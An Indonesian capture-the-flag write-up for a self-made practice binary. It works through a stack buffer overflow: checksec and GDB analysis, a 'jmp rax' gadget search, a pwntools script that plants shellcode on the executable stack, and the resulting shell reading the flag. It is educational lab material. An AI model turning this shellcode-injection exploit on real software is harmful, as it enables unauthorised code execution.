# Shellcode Write up

## note
chall bikin sendiri , but enough untuk latian seputar shellcode.


# analysis and step by step exploit

leak metadata dan proteksi 
```
└> file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5cb8a268e20958c7870bf697dcb935667a5dc1a0, for GNU/Linux 3.2.0, not stripped

└> pwn checksec vuln
[*] '/home/rotalactf/reno/pwn/project/shellcoding/shell/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```
proteksi sangat buruk, tidak ada pie, tidak ada canary, dan nx mati sehingga kita bisa mengeksekusi instruksi di stack. aku akan berencana memasukkan shellcode ke stack jika
bisa. 

dengan **GDB** aku menemukan beberapa fungsi
- main
- vulnerable
- greet
- usefulGadgets

main tidak melakukan apapun selain memanggil greet dan vulnerable. menurut hasil disassemble nya, fungsi vulnerable terdapat kerentanan **buffer overflow**
```Assembly
Dump of assembler code for function vulnerable:
   0x00000000004011fb <+0>:     endbr64
   0x00000000004011ff <+4>:     push   rbp
   0x0000000000401200 <+5>:     mov    rbp,rsp
   0x0000000000401203 <+8>:     sub    rsp,0x40  <- ukuran buffer yang ada di stack (mirip: char variable[0x40]; )
   ------------------ ----:     ---    ---,----
   0x0000000000401231 <+54>:    lea    rax,[rbp-0x40]
   0x0000000000401235 <+58>:    mov    esi,0x80 <- maksimal input yang 'diperbolehkan' oleh fgets() (mirip : fgets(variable, 0x80,stdin);
   0x000000000040123a <+63>:    mov    rdi,rax
   0x000000000040123d <+66>:    call   0x4010a0 <fgets@plt>
   -[ epilog ]-
   0x0000000000401242 <+71>:    nop
   0x0000000000401243 <+72>:    leave
   0x0000000000401244 <+73>:    ret
```

karena fgets memberikan ukuran sebesar itu, jika aku memberi input melebihi batas buffer misalnya huruf A sebanyak 0x48, inputku akan tetap valid di binary, namun yang tersimpan
di dalam stack hanya huruf A dari 0x0 sampai 0x40. 

sisanya dari 0x41 sampapi 0x48 akan tersimpan diluar stack dan mulai **menimpa alamat memori terdekat** seperti **saved rbp** dan **return address**. 

kerentanan ini SEMPURNA untuk meletakkan shellcode. untuk kali ini aku akan meletakkan shellcode di stack. jadi rencananya payloadku akan jadi

`shellcode + padding + gadget jump ke stack`

ada banyak cara untuk melakukan jump ke stack, tergantung kondisi binarynya. aku akan mencoba melihat kondisinya dengan memasang breakpoint tepat di bawah fungsi call fgets
(vulnerable+71). 

```
pwndbg> b *vulnerable +71
Breakpoint 1 at 0x401242
pwndbg> r
Starting program: /home/rotalactf/reno/pwn/project/shellcoding/shell/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

=====================================
        Layanan curhat gratis
=====================================
sini cerita dulu : iloveshinobu
```

aku sengaja memasukkan string yang mudah di cari, dengan bantuan pwndbg aku bisa melihat kondisi binary dengan mudah.

<p align="center"> <img width="953" height="157" alt="image" src="https://github.com/user-attachments/assets/63fcb225-a3e3-414b-aeb5-f13f5469a655" /> </p>

lihat, alamat dari inputku di stack biasanya memang disimpan oleh rsp, Tapi kali ini register **RAX** juga menyimpannya. untuk memastikan:
```
pwndbg> i r $rax
rax            0x7fffffffdce0      0x7fffffffdce0
pwndbg> x/s 0x7fffffffdce0
0x7fffffffdce0: "iloveshinobu\n"
```
fix rax menyimpan alamat stack . sekarang aku harus mencari gadget untuk melompat ke rax, gadget itu seperti `jmp rax`. ini adalah salah satu teknik terkenal dalam melakukan
jump ke stack tanpa leak alamat stack sama sekali.

untuk mencari gadget nya bisa pakai ROPgadget:
```
└> ROPgadget --binary ./vuln | grep "jmp rax"
0x0000000000401125 : je 0x401130 ; mov edi, 0x404038 ; jmp rax
0x0000000000401167 : je 0x401170 ; mov edi, 0x404038 ; jmp rax
0x000000000040112c : jmp rax
```
aku akan ambil alamat gadget yang paling bawah: **0x40112c**   
untuk jaga jaga aku juga mengambil gadget ret, untuk mengatasi masalah stack alignment.
```
└> ROPgadget --binary ./vuln | grep "ret"
0x000000000040101a : ret
```
ret gadget : **0x4101a**


setelah itu aku membuat skrip ini: 
```Python
from pwn import *

context.binary = ELF('./vuln')
p = process()

jmprax = 0x40112c
ret = 0x40101a

shellcode = asm(shellcraft.sh()) 
padd = b'A'*(0x48-len(shellcode))
pay = flat(
    shellcode,
    padd,
    jmprax
)
p.sendline(pay)
p.interactive()
```
dan saat menjalankan nya 
```
└> python3 solver.py
[*] '/home/rotalactf/reno/pwn/project/shellcoding/shell/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
[+] Starting local process '/home/rotalactf/reno/pwn/project/shellcoding/shell/vuln': pid 39022
[*] Switching to interactive mode

=====================================
        Layanan curhat gratis
=====================================
sini cerita dulu : [*] Got EOF while reading in interactive
$ pwd
[*] Process '/home/rotalactf/reno/pwn/project/shellcoding/shell/vuln' stopped with exit code -4 (SIGILL) (pid 39022)
[*] Got EOF while sending in interactive
```
error jay , SIGILL. 
aku akan coba tambahkan gadget ret sebelum jmp rax.

```python
pay = flat(
    shellcode,
    padd,
    ret,
    jmprax
)
```
hasilnya masih error juga. sampai ke ret ke 2.
```Python
pay = flat(
    shellcode,
    padd,
    ret, ret,
    jmprax
)
```
```
└> python3 solver.py
[*] '/home/rotalactf/reno/pwn/project/shellcoding/shell/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
[+] Starting local process '/home/rotalactf/reno/pwn/project/shellcoding/shell/vuln': pid 39128
[*] Switching to interactive mode

=====================================
        Layanan curhat gratis
=====================================
sini cerita dulu : $ ls
flag.txt  solver.py  source.c  vuln
$ cat flag.txt
THPCTF{sh3llc0d3_3x3cut10n_v14_st4ck_0v3rfl0w}

```
welldone 
flag : **THPCTF{sh3llc0d3_3x3cut10n_v14_st4ck_0v3rfl0w}**
